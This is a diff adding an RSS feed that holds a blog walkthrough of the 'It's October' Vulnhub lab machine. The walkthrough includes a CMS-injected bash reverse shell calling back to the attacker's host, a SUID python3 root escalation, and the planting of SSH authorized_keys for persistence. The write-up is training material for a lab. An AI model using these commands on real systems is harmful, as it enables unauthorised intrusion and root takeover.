@@ -1,0 +1,247 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>It&#039;s October Walkthrough Archives - Armour Infosec</title>
+	<atom:link href="https://www.armourinfosec.com/tag/its-october-walkthrough/feed/" rel="self" type="application/rss+xml" />
+	<link>https://www.armourinfosec.com/tag/its-october-walkthrough/</link>
+	<description>Do Your Part - Be Security Smart</description>
+	<lastBuildDate>Fri, 10 Apr 2020 19:40:49 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.3.1</generator>
+
+<image>
+	<url>https://www.armourinfosec.com/wp-content/uploads/2018/02/ai.png</url>
+	<title>It&#039;s October Walkthrough Archives - Armour Infosec</title>
+	<link>https://www.armourinfosec.com/tag/its-october-walkthrough/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>It&#8217;s October Vulnhub Walkthrough</title>
+		<link>https://www.armourinfosec.com/its-october-vulnhub-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/its-october-vulnhub-walkthrough/#comments</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 07 Apr 2020 11:27:53 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[It's October Walkthrough]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25948</guid>
+
+					<description><![CDATA[<p>Here&#8217;s the new challenge of &#8220;It&#8217;s October Vulnhub Walkthrough&#8221;.  It&#8217;s October is an easy box for the beginner and wannabe...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/its-october-vulnhub-walkthrough/">It&#8217;s October Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Here&#8217;s the new challenge of <a href="https://www.infosecwarrior.com/its-october/"><strong>&#8220;It&#8217;s October Vulnhub Walkthrough&#8221;</strong></a>.  It&#8217;s October is an easy box for the beginner and wannabe hackers. It is a box learning about October CMS and enumeration. The box was designed by<a href="https://twitter.com/akankshavermasv"> Akansha Verma</a>. This machine got something unique as it teaches you how you can exploit a cms even if you can&#8217;t find any known vulnerability.</p>
+<h3><img decoding="async" fetchpriority="high" class="alignnone wp-image-25949 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313.png" alt="It's October Vulnhub Walkthrough" width="798" height="317" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313.png 798w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313-300x119.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313-768x305.png 768w" sizes="(max-width: 798px) 100vw, 798px" /></h3>
+<h3>Pentester Methodology</h3>
+<h5>Network Scanning</h5>
+<ul>
+<li>nmap</li>
+<li>netdiscover</li>
+</ul>
+<h5>Enumeration</h5>
+<ul>
+<li>nikto</li>
+<li>gobuster</li>
+<li>placing of reverse shell</li>
+</ul>
+<h5>Privilege Escalation</h5>
+<ul>
+<li>abusing SETUID</li>
+</ul>
+<h3>Network Discovery</h3>
+<p>In order to get the IP of the machine I used, netdiscover. As I allotted host-only adapter to my machine.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+
+Currently scanning: 192.168.157.0/16   |   Screen View: Unique Hosts                                                                                        
+4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222               
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.2.2     08:00:27:ac:26:45      1      42  PCS Systemtechnik GmbH      
+192.168.2.12    08:00:27:cb:f2:fb      3     180  PCS Systemtechnik GmbH</pre>
+<p>And got my IP : <strong>192.168.2.12.</strong> Now lets begin with nmap scan.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -A -O -sS -sC -p- 192.168.2.12
+
+Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-04-06 18:59 IST
+Nmap scan report for 192.168.2.12
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
+|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Homepage | My new websites
+3306/tcp open  mysql   MySQL (unauthorized)
+8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: My Note
+MAC Address: 08:00:27:CB:F2:FB (Oracle VirtualBox virtual NIC)
+</pre>
+<p>I saw that ports <strong>80</strong> and <strong>8080</strong> are open, so without any delay, I visited the page.</p>
+<p><img decoding="async" class="alignnone wp-image-25950 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-1024x576.png" alt="It's October Vulnhub Walkthrough" width="1024" height="576" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-1024x576.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-300x169.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-768x432.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>It&#8217;s just a normal website. I don&#8217;t get anything useful in page source. But still moving forward.</p>
+<p><img decoding="async" class="alignnone wp-image-25951 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-1024x576.png" alt="" width="1024" height="576" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-1024x576.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-300x169.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-768x432.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>This is also a simple web page. But it consists a clue in the <strong>page source</strong> to visit <strong>192.168.2.12/mynote.txt</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25952" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-06-02.png" alt="" width="400" height="99" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-06-02.png 374w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-06-02-300x75.png 300w" sizes="(max-width: 400px) 100vw, 400px" /></p>
+<p>We got credentials for cms <strong>admin:adminadmin2. </strong>I used <strong>nikto</strong> for further enumeration but nothing much.</p>
+<p>So I tried directory brute-forcing. I used <strong>gobuster</strong> and found a directory /<strong>backend </strong>showing the code 302.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://192.168.2.12/
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.2.12/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/04/06 19:14:00 Starting gobuster
+===============================================================
+/themes (Status: 301)
+/modules (Status: 301)
+/0 (Status: 200)
+/storage (Status: 301)
+/plugins (Status: 301)
+/backend (Status: 302)
+/vendor (Status: 301)
+/config (Status: 301)
+Progress: 13383 / 220561 (6.07%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/04/06 19:22:15 Finished
+===============================================================</pre>
+<p>Eureka. We got a CMS login page of OCTOBER CMS. I the old credential for the login.</p>
+<p><img decoding="async" class="alignnone wp-image-25953 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04.png" alt="" width="906" height="571" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04.png 906w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04-300x189.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04-768x484.png 768w" sizes="(max-width: 906px) 100vw, 906px" /></p>
+<p>&nbsp;</p>
+<p>And we are in.. The first checkpoint arrived. Now we need to upload a reverse shell on the CMS in order to get a shell. So for that, we <strong>open cms tab </strong> on the <strong>Dashboard&gt; </strong>click on <strong>+ADD&gt;</strong>enter the details of the page along with the shell&gt;<strong>Save it.</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">function onstart(){
+     exec("/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.2.1/1505 0&gt;&amp;1'");
+}</pre>
+<p><img decoding="async" class="alignnone wp-image-25954 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/12.png" alt="It's October Vulnhub Walkthrough" width="1365" height="735" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/12.png 1365w, https://www.armourinfosec.com/wp-content/uploads/2020/04/12-300x162.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/12-1024x551.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/12-768x414.png 768w" sizes="(max-width: 1365px) 100vw, 1365px" /></p>
+<p>&nbsp;</p>
+<p>Now start the listener on the local machine and call the web page on the web.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nc -nlvp 1505
+
+listening on [any] 1505 ...
+connect to [192.168.2.1] from (UNKNOWN) [192.168.2.12] 4038
+bash-5.0$ id
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+<h3>Privilege Escalation:</h3>
+<p>Now for the privilege, I got nothing but a local user named <strong>armour</strong>. Then we checked for suid:</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">bash-5.0$ find / -perm -u=s -type f 2&gt;/dev/null
+
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/python3
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/python3.7
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper</pre>
+<p>&nbsp;</p>
+<p>So we got <strong>SUID</strong> bit configured on <strong>/bin/python3.</strong> We can approach for the root using this.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">bash-5.0$ cd /tmp/
+bash-5.0$ vim armour.py 
+
+ #!/usr/bin/python
+ import os
+ os.execl("/bin/bash","sh","-p")
+ ~                                                                               
+ ~                                                                               
+ ~                                                                               
+ ~                                                                               
+ :wq!
+                                                                                                
+bash-5.0$ chmod 777 armour.py 
+bash-5.0$ python3 armour.py 
+
+sh-5.0# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+sh-5.0# cd /root/
+sh-5.0# ls
+proof.txt
+sh-5.0# cat proof.txt 
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
+</pre>
+<p>BOOM! we have the flag and euid of root!!. But we need to get the proper shell so I transfer the authorized_keys to the machine and called for ssh connection.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-5.0# cd /root/.ssh
+sh-5.0# wget http://192.168.2.1:8080/authorized_keys 
+--2020-04-06 10:23:55--  http://192.168.2.1:8080/authorized_keys
+Connecting to 192.168.2.1:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 569 [application/octet-stream]
+Saving to: ‘authorized_keys’
+
+authorized_keys     100%[===================&gt;]     569  --.-KB/s    in 0s      
+
+2020-04-06 10:23:55 (41.3 MB/s) - ‘authorized_keys’ saved [569/569]
+
+sh-5.0# ls 
+authorized_keys
+
+#ssh 192.168.2.12
+The authenticity of host '192.168.2.12 (192.168.2.12)' can't be established.
+ECDSA key fingerprint is SHA256:DYZkjGYMu99f1Ml7F6XHJ+4Oh/GISu41/GP0Y+yMgpg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.12' (ECDSA) to the list of known hosts.
+   ##############################################################################################
+   #                                      Armour Infosec                                        #
+   #                         --------- www.armourinfosec.com ------------                       #
+   #                                    It's October	                                        #
+   #                               Designed By  :- Akanksha Sachin Verma                        #
+   #                               Twitter      :- @akankshavermasv                             #
+   ##############################################################################################                                       IP:\4
+                                       Hostname: \n
+Debian GNU/Linux 10
+Linux october 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Mar 27 10:53:25 2020 from 192.168.1.6
+
+root@october:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@october:~# hostname
+october
+root@october:~# uname -a
+Linux october 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
+root@october:~# cd 
+root@october:~# cat proof.txt 
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
+</pre>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/its-october-vulnhub-walkthrough/">It&#8217;s October Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/its-october-vulnhub-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
